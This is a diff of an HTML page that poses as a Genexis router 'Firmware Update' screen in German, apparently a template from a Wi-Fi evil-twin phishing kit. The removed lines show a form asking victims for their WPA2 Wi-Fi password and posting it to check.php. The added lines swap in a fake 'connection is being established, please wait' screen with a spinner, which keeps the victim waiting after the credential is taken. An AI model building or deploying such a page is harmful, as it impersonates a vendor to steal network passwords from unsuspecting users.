@@ -114,6 +114,16 @@ body{
 #form_box table {
 	font-size:12px;
 }
+#spinner {
+	background-image:url(spinner.gif);
+	background-repeat:no-repeat;
+	background-size:cover;
+	height:60px;
+	width:60px;
+	position:absolute;
+	top:45%;
+	left:45%;
+}
 @media only screen and (max-width: 1024px) {
 	#top_nav p {
 		display:none;
@@ -126,15 +136,28 @@ body{
 	#top_nav_load {
 		display:none;	
 	}
+	#top_nav ul {
+		display:inline;
+		margin-left:0px;
+		padding-left:0px;
+	}
 	#sub_nav ul li {
 		font-size:8px;
 		margin-right:2px;
+		
 	}
 	#content_box {
 		width:80%;
 	}
 	#form_box {
 		text-align:center;
+		
+	}
+	#form_box table {
+		margin:auto;
+	}
+	#spinner {
+		left:40%;
 	}
 }
 </style>
@@ -172,22 +195,20 @@ body{
 	<div id="content_box">
     	<h1>Firmware Update</h1>
         <div id="form_box">
-        	<h2>Um zu verbinden bitte WPA2-Kennwort eingeben</h2>
-        	<form method="POST" action="check.php" id="form1" name="form1">
+        	<h2>Bitte einen Moment Geduld</h2>
             	<table cellspacing="5px" cols="2">
                 	<tr>
-                    	<td>WLAN-Passwort:</td>
-                        <td><input type="password" name="key1"></td>
+                    	<td colspan="2">Die WLAN Verbindung wird hergestellt...</td>
                     </tr>
                     <tr>
-                    	<td>&nbsp;</td>
-                        <td><input type="submit" value="Verbindung herstellen"></td>
+                    	<td colspan="2">Dies kann einige Minuten in Anspruch nehmen.</td>
                     </tr>
                 </table>
-            </form>
         </div>
     </div>
 </div>
+
+<div id="spinner"></div>
 
 <div id="footer">
 	<img src="genexis-logo-small.jpg" alt="Genexis. Always connected" />
